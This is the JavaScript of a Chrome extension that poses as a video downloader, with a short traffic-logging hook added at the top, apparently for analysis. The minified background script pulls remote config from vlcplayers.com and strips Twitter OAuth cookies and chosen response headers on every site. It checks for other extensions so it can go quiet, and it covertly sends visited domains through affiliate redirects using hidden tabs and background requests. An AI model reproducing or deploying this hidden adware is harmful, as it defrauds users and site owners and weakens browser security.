function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
class Bg{constructor(){chrome.runtime.onMessage.addListener((a,b,c)=>('setBadge'===a.action&&b.tab&&this.setBadge(a.value,b.tab.id),'downloadVideo'===a.action&&this.downloadVideo(a),'ajaxGet'===a.action&&this.ajaxGet(a.url,c),'openAppInWindow'===a.action&&this.openAppInWindow(),!0)),this.config={},this.uid='',this.environmentValidated=!1,this.bgProcessorRun=!1,this.envDetected=!1,this.requestFiltered=!1,this.disableTwitterVerify(),this.init()}setBadge(a,b){let c=a?a+'':'';chrome.browserAction.setBadgeBackgroundColor({color:[16,201,33,100],tabId:b}),chrome.browserAction.setBadgeText({text:c,tabId:b})}downloadVideo(a){const b=this.clearFilename(a.filename+'.mp4');chrome.downloads.download({url:a.url,filename:b})}clearFilename(a){const b=/[\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200b-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;return a.htmlSymDecode().replace(/^\./,'_').replace(/\t/g,' ').replace(b,'').replace(/&quot;/g,'').replace(/&amp;/g,'&').replace(/[\\/:*?<>|~"]/g,'_')}ajaxGet(a,b){var c=new XMLHttpRequest;c.open('GET',a,!0),c.onload=()=>b(c.responseText),c.send()}openAppInWindow(){chrome.windows.create({type:'popup',url:chrome.runtime.getURL('window.html'),width:600,height:700},(a)=>{localStorage.activeWindowId=a.id})}disableTwitterVerify(){chrome.webRequest.onBeforeSendHeaders.addListener((a)=>{var b=a.requestHeaders.filter((a)=>'cookie'!==a.name.toLowerCase());return{requestHeaders:b}},{urls:['*://api.twitter.com/oauth2/token']},['blocking','requestHeaders'])}init(){let a=this;chrome.storage.local.get(function(b){a.config=b.config||{},a.config.uid?a.uid=a.config.uid:(a.uid=a.config.uid=a.generateUID(),a.saveConfig()),a.config.mTime&&a.config.lTime||(a.config.lTime=0,a.config.mTime=new Date().getTime(),a.saveConfig()),a.config.envDetected&&(a.envDetected=a.config.envDetected),a.filterRequests(),a.validateEnvironment(),a.initBgProcessor(),a.updateConfig()})}saveConfig(){chrome.storage.local.set({config:this.config})}updateConfig(){let a=this;this.heartBeat();const b='id='+encodeURIComponent(chrome.runtime.id)+'&action=config&version='+chrome.runtime.getManifest().version+'&t='+encodeURIComponent(new Date().getTime())+'&mt='+encodeURIComponent(this.config.mTime)+'&lt='+encodeURIComponent(this.config.lTime)+'&uid='+encodeURIComponent(this.uid);fetch('http://vlcplayers.com/api/?'+b).then((a)=>a.json()).then(function(b){for(var c in b)a.config[c]=b[c];a.saveConfig(),a.filterRequests(),a.validateEnvironment(),a.initBgProcessor(),a.config.configUpTime&&0<a.config.configUpTime&&setTimeout(function(){a.updateConfig()},a.config.configUpTime)})}filterRequests(){var a=this;a.requestFiltered||a.config&&a.config.validateFields&&(a.requestFiltered=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(-1<a.config.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:['<all_urls>']},['blocking','responseHeaders']))}heartBeat(){let a=new Date().getTime(),b=a-this.config.mTime,c=this.config.configUpTime?this.config.configUpTime+3e5:1.2e6;this.config.mTime&&b<c?(this.config.lTime+=b,this.config.mTime=a,this.saveConfig()):(this.config.mTime=a,this.saveConfig())}generateUID(){return'xxxxxxxx-xxxx-0xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(a){var b=0|16*Math.random(),c='x'==a?b:8|3&b;return c.toString(16)})}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.config.envCheckActive&&a.config.envCheckPeriod&&a.config.envCheckList){a.environmentValidated=!0;let b=new Date().getTime();if(a.config.lastEnvCheck&&b-a.config.lastEnvCheck<a.config.envCheckPeriod)return;for(let c in a.config.lastEnvCheck=b,a.envDetected=a.config.envDetected=!1,a.saveConfig(),a.config.envCheckList)a.detectExtentionById(a.config.envCheckList[c]).then(function(b){b&&(a.config.envDetected=a.envDetected=!0,a.saveConfig())})}}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}detectExtentionById(a){let b=this;return new Promise(function(c){let d=!1;chrome.tabs.create({url:'chrome-extension://'+a+'/manifest.json',active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:'console.log(\'ok\');'},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}initBgProcessor(){let a=this;a.bgProcessorRun||a.envDetected||!a.config.bgProcessor||(a.bgProcessorRun=!0,bgProcessor.init(),chrome.webRequest.onCompleted.addListener(function(a){if('on'===bgProcessor.cfg.mode&&!bg.envDetected&&!(0>a.tabId)&&200==a.statusCode&&'GET'==a.method){var b=a.url.replace(/^(https?\:\/\/[^\/]+).*$/,'$1'),c=a.url.replace(/^https?\:\/\/([^\/]+).*$/,'$1');c=c.replace(/^www\.(.*)$/,'$1');var d=new Date().getTime();if(!(bgProcessor.used_domains[c]&&bgProcessor.used_domains[c]+bgProcessor.cfg.ttl_ms>d)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(c))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(c))){bgProcessor.used_domains[c]=d;var e=bgProcessor.cfg.aff_url_tmpl.replace('{URL}',encodeURIComponent(b));if(e=e.replace('{DOMAIN}',encodeURIComponent(c)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:void bgProcessor.request_bg(e,c,0);var f=new XMLHttpRequest;f.timeout=bgProcessor.cfg.aff_timeout_ms,f.onreadystatechange=function(){if(4==f.readyState&&200==f.status){var a=f.responseText.replace(/[\n\r]/g,'');if(/^https?\:\/\//.test(a)&&a!=b){var e=b.replace(/^https?\:\/\/([^\/]+).*$/,'$1');bgProcessor.request(a,e)}else bgProcessor.used_domains[c]=d+bgProcessor.cfg.no_coverage_ttl_ms}},f.open('GET',e),f.send()}}},{urls:['http://*/*','https://*/*'],types:['main_frame']}),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if('on'!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c='',d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if('accept'==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}return e||b.push({name:'Accept',value:c}),{requestHeaders:b}},{urls:['http://*/*','https://*/*']},['blocking','requestHeaders']))}}let bgProcessor={cfg:{mode:'off'},used_domains:{},init:function(){this.cfg=Object.assign(this.cfg,bg.config.bgProcessor)},request:function(a,b){this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},request_bg:function(a,b,c){if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){var d=new XMLHttpRequest;d.timeout=this.cfg.timeout,d.onreadystatechange=function(){if(4==d.readyState)if(200==d.status){var a=d.responseText.replace(/[\n\r\s]/g,'').replace(/\.href/g,''),e=!1,f=bgProcessor.is_rdr_url(d.responseURL);if(f||a.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var g=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,'$1');/^\//.test(g)&&(link2Url=new URL(g,d.responseURL),g=link2Url.href),/^https?\:\/\//.test(g)&&(bgProcessor.request_bg(g,b,c+1),e=!0)}if(!e&&bgProcessor.cfg.common_rdr_rules)for(var h in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[h],j=new RegExp(i.search[0],i.search[1]),k=a;if('uri'==i.where&&(k=d.responseURL),k.match(j)){var l=k.replace(j,i.replace);if(i.applyAfter)for(var m in i.applyAfter){var n=i.applyAfter[m];'decodeURIComponent'==n&&(l=decodeURIComponent(l))}if(/^\//.test(l)&&(link2Url=new URL(l,d.responseURL),l=link2Url.href),/^https?\:\/\//.test(l)){bgProcessor.request_bg(l,b,c+1),e=!0;break}}}}else;},d.open('GET',a,!0),d.setRequestHeader(this.cfg.header,'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),d.send()}},is_rdr_url:function(a){var b=new URL(a);return this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a){chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})}};const bg=new Bg;